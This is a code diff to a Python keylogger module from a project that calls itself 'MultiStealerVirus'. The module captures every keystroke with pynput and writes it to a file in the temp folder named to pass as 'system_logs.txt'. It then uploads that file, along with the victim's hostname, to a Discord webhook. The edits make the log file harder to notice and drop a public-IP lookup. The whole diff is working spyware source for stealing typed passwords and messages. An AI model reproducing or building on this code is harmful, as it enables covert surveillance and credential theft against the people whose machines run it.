@@ -1,17 +1,17 @@
 from pynput import keyboard
-import requests
 from discord import SyncWebhook, File
 import discord
 import threading
 import socket
+import os
 from config import INTERVAL
 
 
 class Keylogger:
-    def __init__(self, webhook_url):
+    def __init__(self, webhook_url=""):
         self.keys = ""
         self.webhook_url = webhook_url
-
+        
     def send(self):
         try:
             try:
@@ -19,20 +19,20 @@ class Keylogger:
             except:
                 return
 
-            try:
-                ip = requests.get("https://api.ipify.org").text
-            except:
-                ip = "Unknown"
+            #try:
+            #    ip = requests.get("https://api.ipify.org").text
+            #except:
+            #    ip = "Unknown"
 
             embed = discord.Embed(
                 title = "Keylogger data",
-                description = f"Keylogger data for: {socket.gethostname()}, {ip}",
+                description = f"Keylogger data for: {socket.gethostname()}",
                 color = 0x10131c
             )
 
             embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
             try:
-                webhook.send(embed=embed, file=File("notes.txt"))
+                webhook.send(embed=embed, file=File(f"{os.getenv('temp')}\system_logs.txt"))
             except:
                 pass
         except:
@@ -46,21 +46,22 @@ class Keylogger:
     
     #def send(self):
     #    try:
-    #        with open("notes.txt", "r") as f:
+    #        with open(f"{os.getenv('temp')}\system_logs.txt", "r") as f:
     #            payload = json.dumps({"content": f.read()})
-    #            requests.post(self.url, data=payload, headers={"Content-Type": "application/json"})
+    #            requests.post(self.webhook_url, data=payload, headers={"Content-Type": "application/json"})
     #    except:
     #        pass
     #    finally:
     #        try:
-    #            timer = threading.Timer(self.interval, self.send)
-    #            timer.start()
+    #            if self.running:
+    #                timer = threading.Timer(INTERVAL, self.send)
+    #                timer.start()
     #        except:
     #            pass
 
     def on_press(self, key):
         try:
-            with open("notes.txt", "w", encoding="utf-8") as f:
+            with open(f"{os.getenv('temp')}\system_logs.txt", "w", encoding="utf-8") as f:
                 if key == keyboard.Key.enter:
                     self.keys += "\n"
                     f.write(self.keys)
